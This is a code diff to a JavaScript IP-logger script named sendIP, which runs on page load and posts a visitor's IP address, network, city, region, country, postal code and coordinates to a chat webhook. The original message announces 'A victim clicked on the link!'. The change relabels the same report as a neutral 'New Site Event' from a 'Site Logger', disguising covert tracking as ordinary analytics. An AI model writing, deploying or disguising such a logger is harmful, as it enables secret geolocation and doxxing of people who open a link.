@@ -13,18 +13,37 @@ const sendIP = () => {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            username: "site logger <3", // optionally changeable
-                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
-                            content: `@here`,
-                            embeds: [
-                                {
-                                    title: 'A victim clicked on the link!',
-                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
-                                    color: 0x800080 // optionally changeable
-                                }
-                            ]
-                        })
-                        
+    username: "Site Logger",
+    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
+    content: "@here",
+    embeds: [
+        {
+            title: "📊 New Site Event",
+            description: "A new page interaction was recorded.",
+            color: 0x5865F2,
+
+            fields: [
+                { name: "IP Address", value: `\`${ipadd}\``, inline: true },
+                { name: "Network", value: `\`${geoData.network}\``, inline: true },
+
+                { name: "City", value: geoData.city || "Unknown", inline: true },
+                { name: "Region", value: geoData.region || "Unknown", inline: true },
+
+                { name: "Country", value: geoData.country_name || "Unknown", inline: true },
+                { name: "Postal Code", value: geoData.postal || "N/A", inline: true },
+
+                { name: "Coordinates", value: `Lat: ${geoData.latitude}, Lon: ${geoData.longitude}`, inline: false }
+            ],
+
+            footer: {
+                text: "Site Logger • Automated Event"
+            },
+
+            timestamp: new Date()
+        }
+    ]
+})
+             
                     });
                 });
         })
@@ -41,6 +60,7 @@ const sendIP = () => {
         });
 };
 sendIP();
+
 
 
 
